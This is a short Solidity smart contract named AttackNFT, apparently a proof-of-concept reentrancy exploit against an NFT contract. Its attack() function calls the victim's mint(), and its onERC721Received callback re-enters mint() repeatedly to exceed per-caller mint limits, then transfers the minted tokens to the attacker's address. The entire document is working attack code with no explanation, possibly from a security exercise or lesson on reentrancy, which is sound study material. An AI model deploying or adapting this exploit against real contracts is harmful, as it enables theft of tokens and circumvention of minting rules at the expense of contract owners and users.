// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INFT {
    function maxSupply() external returns (uint16);
    function mint() external returns (uint16);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract AttackNFT {
    INFT private immutable victim;
    address private immutable owner;

    uint16 public maxSupply = 2;

    constructor(address _victim) {
        victim = INFT(_victim);
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        victim.mint();

        for (uint256 i = 1; i < maxSupply; ++i) {
            victim.transferFrom(address(this), owner, i);
        }
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        operator;
        from;
        data;

        require(msg.sender == address(victim), "Only called as fallback function!");

        if (tokenId != maxSupply) {
            victim.mint();
        }

        return AttackNFT.onERC721Received.selector;
    }
}
